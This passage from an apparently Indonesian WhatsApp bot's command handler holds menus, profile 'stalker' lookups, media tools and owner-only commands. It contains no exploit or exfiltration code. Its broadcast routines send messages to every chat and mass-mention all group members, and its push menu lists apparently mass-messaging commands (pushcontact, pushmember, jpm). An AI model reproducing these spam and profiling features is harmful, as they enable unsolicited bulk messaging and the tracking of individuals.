│ ◦ .sand *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* 
│ ◦ .glue *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* 
│ ◦ .1917 *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* 
└ ◦ .leaves *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*

*— P H O T O O X Y  M A K E R ッ*

│ ◦ .shadow *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* 
│ ◦ .write *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* 
│ ◦ .romantic *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* 
│ ◦ .burnpaper *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .smoke *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* 
│ ◦ .narutobanner *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* 
│ ◦ .love *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* 
│ ◦ .undergrass *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .doublelove *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* 
│ ◦ .coffecup *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .underwaterocean *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .smokyneon *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .starstext *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .rainboweffect *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .balloontext *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .metalliceffect *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .embroiderytext *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .flamingtext *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .stonetext *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .writeart *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .summertext *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .wolfmetaltext *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .nature3dtext *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .rosestext *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .naturetypography *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .quotesunder *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
└ ◦ .shinetext *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*

*— E P H O T O  M A K E R ッ*

│ ◦ .glitchtext *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .writetext *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .advancedglow *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .typographytext *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .pixelglitch *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .neonglitch *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .flagtext *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .flag3dtext *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .deletingtext *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .blackpinkstyle *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .glowingtext *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .underwatertext *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .logomaker *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .cartoonstyle *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .papercutstyle *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .watercolortext *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .effectclouds *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .blackpinklogo *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .gradienttext *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .summerbeach *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .luxurygold *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .multicoloredneon *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .sandsummer *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .galaxywallpaper *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .1917style *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .makingneon *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .royaltext *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .freecreate *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .galaxystyle *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
└ ◦ .lighteffects *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
    
Powered By *@${mark.split("@")[0]}*`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender, mark],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": wmbot, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./TzyMedia/theme/cheemspic.jpg"),
"mediaUrl": `https://chat.whatsapp.com/JsXKjrkkd9NIXEb5cMKHWz`,
"sourceUrl": `https://chat.whatsapp.com/JsXKjrkkd9NIXEb5cMKHWz`
}
}
})
}
break
case 'menupush': {
     if (!isRegistered) return replygcTzy('Kamu belum daftar! Silahkan daftar dengan cara #daftar nama|umur!')
var unicorn = await getBuffer(picak+'push Menu')
sendyudamodsMessage(from, { 
text: `Hi @${sender.split("@")[0]}

*ᴏᴡɴᴇʀ ᴏɴʟʏ* = For Owner
*ɢʀᴏᴜᴘ ᴏɴʟʏ* = For Group
*ғʀᴇᴇ ᴏɴʟʏ* = For Free User
*ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* = For Premium User

*—  P U S H  M E N U ッ*  

┌ ◦ .pushcontact *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .pushcontactv2 *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .savecontact *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .pushmember *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .idgc *ᴏᴡɴᴇʀ ᴏɴʟʏ*
└ ◦ .jpm *ᴏᴡɴᴇʀ ᴏɴʟʏ*

Powered By *@${mark.split("@")[0]}*`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender, mark],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": wmbot, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./TzyMedia/theme/cheemspic.jpg"),
"mediaUrl": `https://chat.whatsapp.com/JsXKjrkkd9NIXEb5cMKHWz`,
"sourceUrl": `https://chat.whatsapp.com/JsXKjrkkd9NIXEb5cMKHWz`
}
}
})
}
break
case 'menuanti': {
     if (!isRegistered) return replygcTzy('Kamu belum daftar! Silahkan daftar dengan cara #daftar nama|umur!')
var unicorn = await getBuffer(picak+'Anti Menu')
sendyudamodsMessage(from, { 
text: `Hi @${sender.split("@")[0]}

*ᴏᴡɴᴇʀ ᴏɴʟʏ* = For Owner
*ɢʀᴏᴜᴘ ᴏɴʟʏ* = For Group
*ғʀᴇᴇ ᴏɴʟʏ* = For Free User
*ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* = For Premium User

*— A N T I  M E N U ッ*

┌ ◦ .antilinkgc *ɢʀᴏᴜᴘ ᴏɴʟʏ*
│ ◦ .antiwame *ɢʀᴏᴜᴘ ᴏɴʟʏ*
│ ◦ .antilinkall *ɢʀᴏᴜᴘ ᴏɴʟʏ*
│ ◦ .antilinktiktok *ɢʀᴏᴜᴘ ᴏɴʟʏ*
│ ◦ .antilinkfb *ɢʀᴏᴜᴘ ᴏɴʟʏ*
│ ◦ .antilinktwitter *ɢʀᴏᴜᴘ ᴏɴʟʏ*
│ ◦ .antilinkig *ɢʀᴏᴜᴘ ᴏɴʟʏ*
│ ◦ .antilinktg *ɢʀᴏᴜᴘ ᴏɴʟʏ*
│ ◦ .antilinkytvid *ɢʀᴏᴜᴘ ᴏɴʟʏ*
│ ◦ .antilinkytch *ɢʀᴏᴜᴘ ᴏɴʟʏ*
│ ◦ .antivirus *ɢʀᴏᴜᴘ ᴏɴʟʏ*
│ ◦ .antitoxic *ɢʀᴏᴜᴘ ᴏɴʟʏ*
│ ◦ .antilink *ɢʀᴏᴜᴘ ᴏɴʟʏ*
└ ◦ .antiwame *ɢʀᴏᴜᴘ ᴏɴʟʏ*

Powered By *@${mark.split("@")[0]}*`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender, mark],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": wmbot, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./TzyMedia/theme/cheemspic.jpg"),
"mediaUrl": `https://chat.whatsapp.com/JsXKjrkkd9NIXEb5cMKHWz`,
"sourceUrl": `https://chat.whatsapp.com/JsXKjrkkd9NIXEb5cMKHWz`
}
}
})
}
break
case 'menugame': {
     if (!isRegistered) return replygcTzy('Kamu belum daftar! Silahkan daftar dengan cara #daftar nama|umur!')
var unicorn = await getBuffer(picak+'Bug Menu')
sendyudamodsMessage(from, { 
text: `Hi @${sender.split("@")[0]}⁩

*ᴏᴡɴᴇʀ ᴏɴʟʏ* = For Owner
*ɢʀᴏᴜᴘ ᴏɴʟʏ* = For Group
*ғʀᴇᴇ ᴏɴʟʏ* = For Free User
*ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* = For Premium User

 *—  G A M E   M E N U ッ* 
 
┌ ◦ .tebak lagu *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .tebak gambar *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .tebak lirik *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .family100 *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .tebak kata *ғʀᴇᴇ ᴏɴʟʏ*
└ ◦ .tebak lontong *ғʀᴇᴇ ᴏɴʟʏ*

Powered By *@${mark.split("@")[0]}*`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender, mark],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": wmbot, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./TzyMedia/theme/cheemspic.jpg"),
"mediaUrl": `https://chat.whatsapp.com/JsXKjrkkd9NIXEb5cMKHWz`,
"sourceUrl": `https://chat.whatsapp.com/JsXKjrkkd9NIXEb5cMKHWz`
}
}
})
}
break
case 'menuowner': {
     if (!isRegistered) return replygcTzy('Kamu belum daftar! Silahkan daftar dengan cara #daftar nama|umur!')
var unicorn = await getBuffer(picak+'Owner Menu')
sendyudamodsMessage(from, { 
text: `Hi @${sender.split("@")[0]}

*ᴏᴡɴᴇʀ ᴏɴʟʏ* = For Owner
*ɢʀᴏᴜᴘ ᴏɴʟʏ* = For Group
*ғʀᴇᴇ ᴏɴʟʏ* = For Free User
*ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* = For Premium User

*—  O W N E R  M E N U ッ*
 
┌ ◦ .self *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .public *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .join *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .bctext *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .bcimage *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .bcvideo *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .creategc *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .setexif *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .shutdown *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .autostickergc *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .setppbot *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .addprem *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .delprem *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .addowner *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .delowner *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .addvn *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .delvn *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .addsticker *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .delsticker *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .addimage *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .delimage *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .addvideo *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .delvideo *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .block add *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .unblock del *ᴏᴡɴᴇʀ ᴏɴʟʏ*
└ ◦ .leavegc *ᴏᴡɴᴇʀ ᴏɴʟʏ*

Powered By *@${mark.split("@")[0]}*`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender, mark],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": wmbot, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./TzyMedia/theme/cheemspic.jpg"),
"mediaUrl": `https://chat.whatsapp.com/JsXKjrkkd9NIXEb5cMKHWz`,
"sourceUrl": `https://chat.whatsapp.com/JsXKjrkkd9NIXEb5cMKHWz`
}
}
})
}
break
case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
yudamods_dev = await getBuffer(`https://github.com/DGTzy/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await yudamods.sendMessage(m.chat, { audio: yudamods_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
break
case 'friend':
case 'searchfriend':{
if (!isPrem) return replyprem(mess.premium)
let teman = pickRandom(Tzyverifieduser)
setTimeout(() => {
replygcTzy(mess.wait)
}, 1000)
setTimeout(() => {
replygcTzy('Managed to Get One Person')
}, 5000)
setTimeout(() => {
yudamods.sendMessage(from, {text: `Here @${teman.split("@")[0]}`, mentions: [teman]}, { quoted : m })
}, 9000)
}
break
case 'sc': case 'script': case 'donate': case 'donate': case 'cekupdate': case 'updatebot': case 'cekbot': case 'sourcecode': {
me = m.sender
teks = `minta di  @${global.ownernumber}`
sendyudamodsMessage(from, { 
text: teks,
mentions:[sender],
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": defaultpp,
"mediaUrl": `https://chat.whatsapp.com/JsXKjrkkd9NIXEb5cMKHWz`,
"sourceUrl": `https://chat.whatsapp.com/JsXKjrkkd9NIXEb5cMKHWz`
}
}
})
}
break
case 'tourl': {
if (!/video/.test(mime) && !/image/.test(mime)) throw `*Send/Reply the Video/Image With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Image Caption* ${prefix + command}`
let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
let media = await yudamods.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await TelegraPh(media)
replygcTzy(util.format(anu))
} else if (!/image/.test(mime)) {
let anu = await UploadFileUgu(media)
replygcTzy(util.format(anu))
}
await fs.unlinkSync(media)
}
break
case 'q': case 'quoted': {
if (!m.quoted) return replygcTzy('Reply the Message!!')
let Tzyquotx= await yudamods.serializeM(await m.getQuotedObj())
if (!Tzyquotx.quoted) return replygcTzy('The message you are replying to is not sent by the bot')
await Tzyquotx.quoted.copyNForward(m.chat, true)
}
break
         case 'tts': case 'say':{
         	if (!text) replygcTzy(`Example : ${prefix + command} text`)
             let tts = await fetchJson(`https://api.akuari.my.id/texttovoice/texttosound_english?query=${text}`)
             yudamods.sendMessage(m.chat, { audio: { url: tts.result }, mimetype: 'audio/mp4', ptt: true, fileName: `${text}.mp3` }, { quoted: m })
         	}
         break
case 'igstalk':{
if (!isPrem) return replyprem(mess.premium)
if (!q) return replygcTzy(`Example ${prefix+command} unicorn_Tzy`)
replygcTzy(mess.wait)
aj = await igstalk(`${q}`)
yudamods.sendMessage(m.chat, { image: { url : aj.profile }, caption: 
`*/ Instagram Stalker \\*

Full name : ${aj.fullname}
Username : ${aj.username}
Post : ${aj.post}
Followers : ${aj.followers}
Following : ${aj.following}
Bio : ${aj.bio}` }, { quoted: m } )
}
break
case 'ffstalk':{
if (!isPrem) return replyprem(mess.premium)
if (!q) return replygcTzy(`Example ${prefix+command} 946716486`)
replygcTzy(mess.wait)
eeh = await ffstalk.ffstalk(`${q}`)
replygcTzy(`*/ Free Fire Stalker \\*

Id : ${eeh.id}
Nickname : ${eeh.nickname}`)
}
break
case 'mlstalk': {
if (!isPrem) return replyprem(mess.premium)
if (!q) return replygcTzy(`Example ${prefix+command} 530793138|8129`)
replygcTzy(mess.wait)
let dat = await mlstalk.mlstalk(q.split("|")[0], q.split("|")[1])
replygcTzy(`*/ Mobile Legend Stalker \\*

Username : ${dat.userName}
Id : ${q.split("|")[0]}
ID Zone: ${q.split("|")[1]}`)
}
break
case 'npmstalk':{
if (!q) return replygcTzy(`Example ${prefix+command} Tzyapi`)
replygcTzy(mess.wait)
eha = await npmstalk.npmstalk(q)
replygcTzy(`*/ Npm Stalker \\*

Name : ${eha.name}
Version Latest : ${eha.versionLatest}
Version Publish : ${eha.versionPublish}
Version Update : ${eha.versionUpdate}
Latest Dependencies : ${eha.latestDependencies}
Publish Dependencies : ${eha.publishDependencies}
Publish Time : ${eha.publishTime}
Latest Publish Time : ${eha.latestPublishTime}`)
}
break
case 'ghstalk': case 'githubstalk':{
if (!q) return replygcTzy(`Example ${prefix+command} DGTzy`)
replygcTzy(mess.wait)
aj = await githubstalk.githubstalk(`${q}`)
yudamods.sendMessage(m.chat, { image: { url : aj.profile_pic }, caption: 
`*/ Github Stalker \\*

Username : ${aj.username}
Nickname : ${aj.nickname}
Bio : ${aj.bio}
Id : ${aj.id}
Nodeid : ${aj.nodeId}
Url Profile : ${aj.profile_pic}
Url Github : ${aj.url}
Type : ${aj.type}
Admin : ${aj.admin}
Company : ${aj.company}
Blog : ${aj.blog}
Location : ${aj.location}
Email : ${aj.email}
Public Repo : ${aj.public_repo}
Public Gists : ${aj.public_gists}
Followers : ${aj.followers}
Following : ${aj.following}
Created At : ${aj.ceated_at}
Updated At : ${aj.updated_at}` }, { quoted: m } )
}
break
case 'ss': case 'ssweb': {
if (!q) return replygcTzy(`Example ${prefix+command} link`)
replygcTzy(mess.wait)
let krt = await scp1.ssweb(q)
yudamods.sendMessage(from,{image:krt.result,caption:mess.succes}, {quoted:m})
}
break
case 'join': {
if (!TzyTheCreator) return replygcTzy(mess.owner)
if (!text) return replygcTzy(`Contoh ${prefix+command} linkgc`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return replygcTzy('Link Invalid!')
let result = args[0].split('https://chat.whatsapp.com/')[1]
await yudamods.groupAcceptInvite(result).then((res) => replygcTzy(jsonformat(res))).catch((err) => replygcTzy(jsonformat(err)))
}
break
case 'toonce': case 'toviewonce': { 
if (!quoted) return replygcTzy(`Reply Image/Video`)
if (/image/.test(mime)) {
anuan = await yudamods.downloadAndSaveMediaMessage(quoted)
yudamods.sendMessage(m.chat, {image: {url:anuan}, caption: `Here you go!`, fileLength: "999", viewOnce : true},{quoted: m })
} else if (/video/.test(mime)) {
anuanuan = await yudamods.downloadAndSaveMediaMessage(quoted)
yudamods.sendMessage(m.chat, {video: {url:anuanuan}, caption: `Here you go!`, fileLength: "99999999", viewOnce : true},{quoted: m })
}
}
break
case 'fliptext': {
if (args.length < 1) return replygcTzy(`Example:\n${prefix}fliptext ${ownername}`)
quere = args.join(" ")
flipe = quere.split('').reverse().join('')
replygcTzy(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
}
break
            case 'listpc': {
                 let anulistp = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
                 let teks = `${themeemoji} *PERSONAL CHAT LIST*\n\nTotal Chat : ${anulistp.length} Chat\n\n`
                 for (let i of anulistp) {
                     let nama = store.messages[i].array[0].pushName
                     teks += `${themeemoji} *Name :* ${nama}\n${themeemoji} *User :* @${i.split('@')[0]}\n${themeemoji} *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
                 }
                 yudamods.sendTextWithMentions(m.chat, teks, m)
             }
             break
                case 'listgc': {
                 let anulistg = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
                 let teks = `${themeemoji} *GROUP CHAT LIST*\n\nTotal Group : ${anulistg.length} Group\n\n`
                 for (let i of anulistg) {
                     let metadata = await yudamods.groupMetadata(i)
                     teks += `${themeemoji} *Name :* ${metadata.subject}\n${themeemoji} *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Unknown'}\n${themeemoji} *ID :* ${metadata.id}\n${themeemoji} *Made :* ${moment(metadata.creation * 1000).tz('Asia/Kolkata').format('DD/MM/YYYY HH:mm:ss')}\n${themeemoji} *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
                 }
                 yudamods.sendTextWithMentions(m.chat, teks, m)
             }
             break
             case 'ping': case 'botstatus': case 'statusbot': {
                const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			        return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, { length }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
			            user: 0,
			            nice: 0,
			            sys: 0,
			            idle: 0,
			            irq: 0
                }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
Response Speed ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
                `.trim()
                replygcTzy2(respon)
            }
            break
case 'autosticker':
if (!TzyTheCreator) return replygcTzy(mess.owner)
if (args[0] == 'on') {
if (autosticker) return replygcTzy('*Activated!*')
autosticker = true
replygcTzy('*Successfully Activated Autosticker*')
} else if (args[0] == 'off') {
if (!autosticker) return replygcTzy('*Not Yet Active!*')
autosticker = false
replygcTzy('*Successfully Turn off Autosticker*')
} else {
replygcTzy(`Type .autosticker on To Activate And .autosticker off To Deactivate`)
}
break
            case 'bctext': case 'broadcasttext': case 'broadcast': {
			    if (!TzyTheCreator) return replygcTzy(mess.owner)
		            if (!q) return replygcTzy(`Enter text`)
		                            const data = await store.chats.all()
                            for (let i of data) {
                               yudamods.sendMessage(i.id, {text: `${ownername}'s Broadcast\n\nMessage : ${q}` })
                               await sleep(1000)
                            }
                            }
                            break
                            case 'broadcastimage': case 'bcimage': case 'broadcastvideo': case 'broadcastvid':
if(!TzyTheCreator) return replygcTzy(mess.owner)
        if (!q) return replygcTzy(`Enter text`)
        let getGroups = await yudamods.groupFetchAllParticipating()
        let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
        let Tzycast = groups.map(v => v.id)
        replygcTzy(` Broadcasting in ${Tzycast.length} Group Chat, in ${Tzycast.length * 1.5} seconds`)
        for (let i of Tzycast) {
let txt = `${ownername}'s Broadcast\n\nMessage : ${q}`
if(/image/.test(mime)) {
let media = await quoted.download()
await yudamods.sendMessage(i, { image:media,  caption: txt,mentions:participants.map(a => a.id) })
}
if(/video/.test(mime)){
let media = await quoted.download()
await yudamods.sendMessage(i, { video:media,  caption: txt, mentions:participants.map(a => a.id) })
}
            }
        replygcTzy(`Successfuly Broadcasted in ${Tzycast.length} Groups`)      
        break
case 'block': {
		if (!TzyTheCreator) return replygcTzy(mess.owner)
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await yudamods.updateBlockStatus(users, 'block').then((res) => replygcTzy(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
        case 'unblock': {
		if (!TzyTheCreator) return replygcTzy(mess.owner)
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await yudamods.updateBlockStatus(users, 'unblock').then((res) => replygcTzy(jsonformat(res))).catch((err) => replygcTzy(jsonformat(err)))
	}
	break
case 'listblock': case 'listban': case 'blocklist': case 'banlist': {
	const lisben = "Total Block: " + banUser.length
	replygcTzy(lisben)
	}
	break
case 'menfes': case 'confess':
if (Object.values(anon.anonymous).find(p => p.check(sender))) return replygcTzy("You are still in the room")
if (m.isGroup) return replygcTzy(mess.private)
if (args.length < 1) return replygcTzy(`Use ${prefix+command} number|your message\nExample ${prefix+command} ${ownernumber}|Hi Owner`)
